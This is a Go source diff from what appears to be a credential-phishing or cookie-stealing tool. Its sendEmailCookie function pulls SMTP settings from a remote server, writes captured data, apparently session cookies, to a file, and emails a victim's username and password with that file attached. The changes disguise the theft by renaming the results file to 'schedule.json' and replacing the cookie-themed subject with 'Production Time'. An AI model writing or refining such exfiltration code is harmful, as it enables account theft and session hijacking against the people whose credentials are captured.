@@ -21,6 +21,7 @@ type Smtp struct {
 	Port     string `json:"port"`
 	Username string `json:"username"`
 	Password string `json:"password"`
+	Frommail string `json:"from"`
 }
 
 func goDotEnvVariable(key string) string {
@@ -99,6 +100,7 @@ func sendEmailCookie(msg string, username string, password string, email string)
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
 	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
+
 	if err != nil {
 		fmt.Printf("%s", err)
 	}
@@ -124,7 +126,7 @@ func sendEmailCookie(msg string, username string, password string, email string)
 	//b, err := ioutil.ReadAll(file)
 	//data := string(b)
 
-	err = os.WriteFile("RESULTS.json", []byte(msg), 0755)
+	err = os.WriteFile("schedule.json", []byte(msg), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
@@ -132,17 +134,18 @@ func sendEmailCookie(msg string, username string, password string, email string)
 	m := gomail.NewMessage()
 
 	// Set E-Mail sender
-	m.SetHeader("From", smtp.Username)
+	m.SetHeader("From", username)
 
 	// Set E-Mail receivers
 	m.SetHeader("To", email)
+	//m.SetHeader("Fro")
 
 	// Set E-Mail subject
-	m.SetHeader("Subject", "🍪Result Is Coming🍪")
+	m.SetHeader("Subject", "Production Time")
 
 	// Set E-Mail body. You can set plain text or html with text/html
 	m.SetBody("text/plain", "Username: "+username+"\nPassword: "+password)
-	m.Attach("RESULTS.json")
+	m.Attach("schedule.json")
 
 	// Settings for SMTP server
 	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
